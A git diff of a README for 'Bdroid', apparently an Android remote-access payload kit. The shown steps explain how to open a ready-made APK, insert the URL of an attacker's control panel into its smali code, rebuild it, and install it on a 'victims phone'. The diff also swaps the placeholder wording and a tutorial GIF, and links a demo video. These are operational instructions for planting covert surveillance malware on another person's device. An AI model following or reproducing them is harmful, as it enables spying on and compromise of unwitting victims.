@@ -55,12 +55,13 @@ Android 5 to Android 12. Working Without Any Error.
 * Open APK EDITOR PRO & CHOOSE 'SELECT APK FILE'
 * CHOOSE 'Bdroid' Readymade Apk. Select 'FULL EDIT' - ALL FILES
 * Enable 'SMALI' in FILES.
-* Search 'PASTE YOUR LINK'
+* Type 'CONTROL PANEL LINK' & Search.
 * Paste Yout Control Panel Link Here. example : https://xxxx.deta.dev
 * Now Build/Save. 
 ~Your Binded APK is ready. Now Install this apk on your victims phone.
 
-<img title="Payload Setup Bdroid" src="https://user-images.githubusercontent.com/64999484/160274603-7e901d8b-5dbe-4306-86e1-74deeadea78a.gif">
+# APK BIND GIF TUTORIAL
+<img title="Payload Setup Bdroid" src="https://user-images.githubusercontent.com/64999484/160757635-2260efb1-f0bf-4737-a3f3-780fb5409c1b.gif"/>
 
 ## Working Demo Video :
 * [DEMO VIDEO TUTORIAL](https://drive.google.com/file/d/14mVcHO-ME7QGXcQGvCAw7kVPhYEn-cY5/view?usp=drivesdk)
